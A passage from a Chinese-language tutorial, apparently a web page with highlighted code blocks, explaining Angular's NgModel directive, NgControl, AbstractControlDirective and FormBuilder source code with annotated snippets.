      <span class="token punctuation">(</span><span class="token operator">&lt;</span>Validator<span class="token operator">&gt;</span>validator<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">registerOnValidatorChange</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> 
          control<span class="token punctuation">.</span><span class="token function">updateValueAndValidity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  dir<span class="token punctuation">.</span>_rawAsyncValidators<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">validator<span class="token operator">:</span> AsyncValidator <span class="token operator">|</span> AsyncValidatorFn</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">&lt;</span>Validator<span class="token operator">&gt;</span>validator<span class="token punctuation">)</span><span class="token punctuation">.</span>registerOnValidatorChange<span class="token punctuation">)</span>
      <span class="token punctuation">(</span><span class="token operator">&lt;</span>Validator<span class="token operator">&gt;</span>validator<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">registerOnValidatorChange</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> 
          control<span class="token punctuation">.</span><span class="token function">updateValueAndValidity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br></div></div><p>_updateDisabled() ,若设置 isDisabled 输入属性，则更新控件的 disabled 属性：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 更新控件的disabled状态</span>
<span class="token keyword">private</span> <span class="token function">_updateDisabled</span><span class="token punctuation">(</span><span class="token parameter">changes<span class="token operator">:</span> SimpleChanges</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// 获取disabled输入属性的当前值</span>
  <span class="token keyword">const</span> disabledValue <span class="token operator">=</span> changes<span class="token punctuation">[</span><span class="token string">'isDisabled'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>currentValue<span class="token punctuation">;</span> 
  <span class="token comment">// 判断是否设置为disabled</span>
  <span class="token keyword">const</span> isDisabled <span class="token operator">=</span> disabledValue <span class="token operator">===</span> <span class="token string">''</span> <span class="token operator">||</span> 
        <span class="token punctuation">(</span>disabledValue <span class="token operator">&amp;&amp;</span> disabledValue <span class="token operator">!==</span> <span class="token string">'false'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  resolvedPromise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>isDisabled <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>control<span class="token punctuation">.</span>disabled<span class="token punctuation">)</span> <span class="token punctuation">{</span>
           <span class="token keyword">this</span><span class="token punctuation">.</span>control<span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 禁用控件</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isDisabled <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control<span class="token punctuation">.</span>disabled<span class="token punctuation">)</span> <span class="token punctuation">{</span>
           <span class="token keyword">this</span><span class="token punctuation">.</span>control<span class="token punctuation">.</span><span class="token function">enable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 启用控件</span>
        <span class="token punctuation">}</span>
   <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>isPropertyUpdated()</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 判断属性是否更新</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">isPropertyUpdated</span><span class="token punctuation">(</span><span class="token parameter">changes<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> any<span class="token punctuation">}</span><span class="token punctuation">,</span>
  viewModel<span class="token operator">:</span> any</span><span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>changes<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span><span class="token string">'model'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment">// @Input('ngModel') model: any;</span>
    <span class="token keyword">const</span> change <span class="token operator">=</span> changes<span class="token punctuation">[</span><span class="token string">'model'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>change<span class="token punctuation">.</span><span class="token function">isFirstChange</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// 判断是否首次改变</span>
    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">looseIdentical</span><span class="token punctuation">(</span>viewModel<span class="token punctuation">,</span> change<span class="token punctuation">.</span>currentValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// JS has NaN !== NaN</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">looseIdentical</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token operator">:</span> any<span class="token punctuation">,</span> b<span class="token operator">:</span> any</span><span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span>
  <span class="token keyword">return</span> a <span class="token operator">===</span> b <span class="token operator">||</span> <span class="token keyword">typeof</span> a <span class="token operator">===</span> <span class="token string">'number'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> b <span class="token operator">===</span> <span class="token string">'number'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isNaN</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> 
    <span class="token operator">&amp;&amp;</span> <span class="token function">isNaN</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>_updateValue()</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 更新控件的值</span>
<span class="token keyword">private</span> <span class="token function">_updateValue</span><span class="token punctuation">(</span>value<span class="token operator">:</span> any<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
   resolvedPromise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>
     <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token punctuation">{</span>emitViewToModelChange<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
   <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> resolvedPromise <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>ngOnDestroy()</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 指令销毁时，从formDirective中移除该控件</span>
<span class="token function">ngOnDestroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span> 
    <span class="token keyword">this</span><span class="token punctuation">.</span>formDirective <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>formDirective<span class="token punctuation">.</span><span class="token function">removeControl</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h3 id="相关源码定义"><a href="#相关源码定义" class="header-anchor">#</a> 相关源码定义</h3> <ul><li>ngModel 指令</li></ul> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token comment">// angular2/packages/forms/src/directives/ng_model.ts 片段</span>
@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'[ngModel]:not([formControlName]):not([formControl])'</span><span class="token punctuation">,</span>
  providers<span class="token operator">:</span> <span class="token punctuation">[</span>formControlBinding<span class="token punctuation">]</span><span class="token punctuation">,</span>
  exportAs<span class="token operator">:</span> <span class="token string">'ngModel'</span> <span class="token comment">// // 导出指令实例，使得可以在模板中调用</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">NgModel</span> <span class="token keyword">extends</span> <span class="token class-name">NgControl</span> <span class="token keyword">implements</span> <span class="token class-name">OnChanges</span><span class="token punctuation">,</span> OnDestroy <span class="token punctuation">{</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>selector 中 [ngModel]:not([formControlName]):not([formControl]) 表示该指令只应用于 Template-Driven 表单中。</p> <p>exportAs - 表示可以使用 first=&quot;ngModel&quot; 语法获取 NgModel 对象</p></div> <ul><li>formControlBinding</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">const</span> formControlBinding<span class="token operator">:</span> any <span class="token operator">=</span> <span class="token punctuation">{</span>
  provide<span class="token operator">:</span> NgControl<span class="token punctuation">,</span>
  useExisting<span class="token operator">:</span> <span class="token function">forwardRef</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> NgModel<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ul><li>NgControl 抽象类</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// angular2/packages/forms/src/directives/ng_control.ts</span>
<span class="token comment">// 所有控件指令都需继承的基类，绑定FormControl对象至DOM元素</span>
<span class="token keyword">export</span> abstract <span class="token keyword">class</span> <span class="token class-name">NgControl</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractControlDirective</span> <span class="token punctuation">{</span>
  <span class="token comment">/** @internal */</span>
  _parent<span class="token operator">:</span> ControlContainer <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  name<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  valueAccessor<span class="token operator">:</span> ControlValueAccessor <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token comment">/** @internal */</span>
  _rawValidators<span class="token operator">:</span> Array<span class="token operator">&lt;</span>Validator<span class="token operator">|</span>ValidatorFn<span class="token operator">&gt;</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token comment">/** @internal */</span>
  _rawAsyncValidators<span class="token operator">:</span> Array<span class="token operator">&lt;</span>AsyncValidator<span class="token operator">|</span>AsyncValidatorFn<span class="token operator">&gt;</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">get</span> <span class="token function">validator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> ValidatorFn <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token operator">&lt;</span>ValidatorFn<span class="token operator">&gt;</span><span class="token function">unimplemented</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
  <span class="token keyword">get</span> <span class="token function">asyncValidator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> AsyncValidatorFn <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token operator">&lt;</span>AsyncValidatorFn<span class="token operator">&gt;</span><span class="token function">unimplemented</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
  abstract <span class="token function">viewToModelUpdate</span><span class="token punctuation">(</span>newValue<span class="token operator">:</span> any<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><ul><li>AbstractControlDirective 抽象类</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// angular2/packages/forms/src/directives/abstract_control_directive.ts 片段</span>
<span class="token keyword">export</span> abstract <span class="token keyword">class</span> <span class="token class-name">AbstractControlDirective</span> <span class="token punctuation">{</span>
  <span class="token keyword">get</span> <span class="token function">valid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control<span class="token punctuation">.</span>valid <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
  <span class="token keyword">get</span> <span class="token function">invalid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control<span class="token punctuation">.</span>invalid <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
  <span class="token keyword">get</span> <span class="token function">errors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> ValidationErrors <span class="token operator">|</span> <span class="token keyword">null</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control <span class="token operator">?</span> 
      <span class="token keyword">this</span><span class="token punctuation">.</span>control<span class="token punctuation">.</span>errors <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
  <span class="token keyword">get</span> <span class="token function">pristine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control<span class="token punctuation">.</span>pristine <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
  <span class="token keyword">get</span> <span class="token function">dirty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control<span class="token punctuation">.</span>dirty <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
  <span class="token keyword">get</span> <span class="token function">touched</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control<span class="token punctuation">.</span>touched <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
  <span class="token keyword">get</span> <span class="token function">untouched</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control<span class="token punctuation">.</span>untouched <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
  <span class="token keyword">get</span> <span class="token function">valueChanges</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Observable<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control <span class="token operator">?</span> 
      <span class="token keyword">this</span><span class="token punctuation">.</span>control<span class="token punctuation">.</span>valueChanges <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
  <span class="token function">hasError</span><span class="token punctuation">(</span>errorCode<span class="token operator">:</span> string<span class="token punctuation">,</span> path<span class="token operator">:</span> string<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control<span class="token punctuation">.</span><span class="token function">hasError</span><span class="token punctuation">(</span>errorCode<span class="token punctuation">,</span> path<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">getError</span><span class="token punctuation">(</span>errorCode<span class="token operator">:</span> string<span class="token punctuation">,</span> path<span class="token operator">:</span> string<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">:</span> any <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>control<span class="token punctuation">.</span><span class="token function">getError</span><span class="token punctuation">(</span>errorCode<span class="token punctuation">,</span> path<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><ul><li>FormBuilder</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// angular2/packages/forms/src/form_builder.ts 片段</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">FormBuilder</span> <span class="token punctuation">{</span>
  
  <span class="token comment">// 基于controlsConfig、extra信息，创建FormGroup对象</span>
  <span class="token function">group</span><span class="token punctuation">(</span>controlsConfig<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> any<span class="token punctuation">}</span><span class="token punctuation">,</span> extra<span class="token operator">:</span> 
      <span class="token punctuation">{</span><span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> any<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">:</span> FormGroup <span class="token punctuation">{</span><span class="token punctuation">}</span>
  
  <span class="token comment">// 基于formState、validator、asyncValidator创建FormControl对象</span>
  <span class="token function">control</span><span class="token punctuation">(</span>
      formState<span class="token operator">:</span> Object<span class="token punctuation">,</span> validator<span class="token operator">:</span> ValidatorFn<span class="token operator">|</span>ValidatorFn<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
      asyncValidator<span class="token operator">:</span> AsyncValidatorFn<span class="token operator">|</span>AsyncValidatorFn<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">:</span> FormControl <span class="token punctuation">{</span><span class="token punctuation">}</span>
  
  <span class="token comment">//基于controlsConfig、validator、asyncValidator创建FormArray对象</span>
  <span class="token function">array</span><span class="token punctuation">(</span>
      controlsConfig<span class="token operator">:</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> validator<span class="token operator">:</span> ValidatorFn <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
      asyncValidator<span class="token operator">:</span> AsyncValidatorFn <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">:</span> FormArray <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>group() 方法的内部实现：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code> <span class="token function">group</span><span class="token punctuation">(</span>controlsConfig<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> any<span class="token punctuation">}</span><span class="token punctuation">,</span> extra<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> any<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">:</span>     
     FormGroup <span class="token punctuation">{</span>
        <span class="token comment">// 创建controls对象集合</span>
        <span class="token keyword">const</span> controls <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_reduceControls</span><span class="token punctuation">(</span>controlsConfig<span class="token punctuation">)</span><span class="token punctuation">;</span> 
       <span class="token comment">// 获取同步验证器</span>
        <span class="token keyword">const</span> validator<span class="token operator">:</span> ValidatorFn <span class="token operator">=</span> extra <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> extra<span class="token punctuation">[</span><span class="token string">'validator'</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token comment">// 获取异步验证器</span>
        <span class="token keyword">const</span> asyncValidator<span class="token operator">:</span> AsyncValidatorFn <span class="token operator">=</span> extra <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span>
          extra<span class="token punctuation">[</span><span class="token string">'asyncValidator'</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">FormGroup</span><span class="token punctuation">(</span>controls<span class="token punctuation">,</span> validator<span class="token punctuation">,</span> asyncValidator<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
